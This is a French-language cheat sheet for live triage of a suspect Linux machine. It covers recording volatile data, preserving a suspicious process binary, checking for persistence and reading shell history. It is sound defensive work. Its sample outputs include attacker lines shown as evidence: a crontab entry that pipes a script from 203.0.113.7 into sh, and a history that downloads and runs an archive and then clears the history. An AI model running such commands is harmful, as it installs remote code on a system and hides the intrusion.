---
title: "Triage à chaud"
cours:
  - library/cyber/forensic/investigation-numerique-forensic/index.md
  - library/cyber/detection/reponse-a-incident/index.md
besoin: "Faire le triage à chaud d'une machine Linux suspecte"
---
# Triage à chaud — Linux

Machine allumée et suspecte : relever ce qui est volatil (processus, connexions) avant ce qui l'est moins
(fichiers, journaux), sans rien détruire. Chaque commande enregistre aussi sa sortie dans le dossier de
collecte.

Les entrées marquées « Repris de » viennent des fiches Linux : elles ne sont écrites qu'à un seul endroit.

Les incontournables : `date -u` · `ps auxf` · `ls -l /proc/<PID>/exe` · `ss -tnp` · `last` · `find -newermt`
{ .kw-cs-top }

## Avant tout

### Ouvrir un dossier de collecte et noter l'heure

```bash title="Commande"
mkdir -p <dossier_collecte> && cd <dossier_collecte>   # dossier de collecte, sur un support externe
date -u | tee 00-debut.txt; hostname | tee -a 00-debut.txt; uptime | tee -a 00-debut.txt   # heure UTC, machine, durée de fonctionnement
```

```bash title="Exemple"
mkdir -p /mnt/usb/collecte-srv-web-01 && cd /mnt/usb/collecte-srv-web-01
date -u | tee 00-debut.txt; hostnamectl | tee -a 00-debut.txt; uptime | tee -a 00-debut.txt
```

??? example "Sortie"
    ```text
    Thu Oct  2 09:40:12 UTC 2026
     Static hostname: srv-web-01
    Operating System: Ubuntu 24.04.1 LTS
     09:40:12 up 3 days,  4:11,  2 users,  load average: 0.31, 0.27, 0.22
    ```

!!! warning "Attention"
    Écrire la collecte sur un support externe, pas sur le disque suspect : chaque fichier créé écrase des traces.

Pour comprendre : [Investigation numérique (forensic)](../../../library/cyber/forensic/investigation-numerique-forensic/index.md)
{ .kw-cs-meta }

![[cheatsheets/linux/fondamentaux/systeme#Voir qui est connecté maintenant]]

## Processus

![[cheatsheets/linux/fondamentaux/processus#Lister tous les processus]]

![[cheatsheets/linux/fondamentaux/processus#Voir les processus enfants d'un PID]]

![[cheatsheets/linux/fondamentaux/processus#Tout savoir sur un PID]]

![[cheatsheets/linux/fondamentaux/processus#Voir les fichiers et connexions d'un PID]]

### Préserver le binaire d'un processus suspect

```bash title="Commande"
sudo cp /proc/<PID>/exe ./preuve_<PID>.bin   # copie le binaire en cours d'exécution
sha256sum ./preuve_<PID>.bin | tee -a empreintes.txt   # son empreinte, notée dans la collecte
```

```bash title="Exemple"
sudo cp /proc/1234/exe ./preuve_1234.bin && sha256sum ./preuve_1234.bin | tee -a empreintes.txt
```

??? example "Sortie"
    ```text
    3f9a1c0e7b2d4a6f8e1c3b5d7f9a0c2e4b6d8f0a1c3e5b7d9f1a3c5e7b9d0f2a  ./preuve_1234.bin
    ```

```bash title="Exemple 2"
sudo cat /proc/1234/maps > preuve_1234_maps.txt   # bibliothèques chargées et régions mémoire
```

Marche même si le fichier a été supprimé du disque après le lancement. Ensuite seulement :
[arrêter le processus](../../linux/fondamentaux/processus.md#arreter-un-processus-poliment-puis-de-force).
{ .kw-cs-meta }

## Réseau

![[cheatsheets/linux/fondamentaux/reseau#Voir les ports en écoute]]

![[cheatsheets/linux/fondamentaux/reseau#Voir les connexions établies]]

## Persistance

### Chercher une persistance

```bash title="Commande"
sudo ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null   # tâches cron du système et des utilisateurs
systemctl list-unit-files --state=enabled                      # services lancés au démarrage
ls -la /etc/profile.d ~/.bashrc ~/.profile ~/.ssh/authorized_keys   # scripts de connexion, clés SSH autorisées
```

```bash title="Exemple"
sudo grep -R . /etc/cron* /var/spool/cron 2>/dev/null | tee persistance-cron.txt
```

??? example "Sortie"
    ```text
    /etc/cron.d/certbot:0 */12 * * * root test -x /usr/bin/certbot && certbot -q renew
    /var/spool/cron/crontabs/www-data:*/10 * * * * curl -s http://203.0.113.7/u.sh | sh
    ```

```bash title="Exemple 2"
sudo find /etc/systemd/system /lib/systemd/system -name "*.service" -newermt "2026-09-25" -ls
# unités de service créées ou modifiées depuis une date
```

Pour comprendre : [Linux — prises de notes, investigation](../../../library/it/linux/linux-prises-de-notes/02-investigation-forensics.md)
{ .kw-cs-meta }

![[cheatsheets/linux/administration/taches#Lister les timers systemd]]

## Traces d'activité

![[cheatsheets/linux/fondamentaux/systeme#Voir les dernières connexions]]

![[cheatsheets/linux/fondamentaux/logs#Trouver les échecs de connexion]]

![[cheatsheets/linux/fondamentaux/logs#Retrouver l'usage de sudo]]

### Lire l'historique des commandes des utilisateurs

```bash title="Commande"
sudo cat /home/<utilisateur>/.bash_history   # commandes tapées par l'utilisateur, dans l'ordre
```

```bash title="Exemple"
sudo tail -n 50 /root/.bash_history
```

??? example "Sortie"
    ```text
    cd /tmp
    wget http://203.0.113.7/k.tar.gz
    tar -xzf k.tar.gz && ./install.sh
    history -c
    ```

```bash title="Exemple 2"
sudo find / -xdev -name ".*_history" -type f -exec ls -l {} \; 2>/dev/null   # tous les historiques (bash, zsh, python…)
```

!!! warning "Attention"
    L'historique n'est écrit qu'à la déconnexion et s'efface facilement : son absence est elle-même un indice.

![[cheatsheets/linux/fondamentaux/fichiers-recherche#Trouver les fichiers modifiés récemment]]

## Clore

### Calculer les empreintes de la collecte

```bash title="Commande"
sha256sum <dossier_collecte>/* > <dossier_collecte>/empreintes-collecte.txt   # empreinte de chaque fichier collecté
```

```bash title="Exemple"
date -u | tee -a 00-debut.txt && sha256sum ./* > empreintes-collecte.txt
```

Pour comprendre : [Réponse à incident](../../../library/cyber/detection/reponse-a-incident/index.md)
{ .kw-cs-meta }
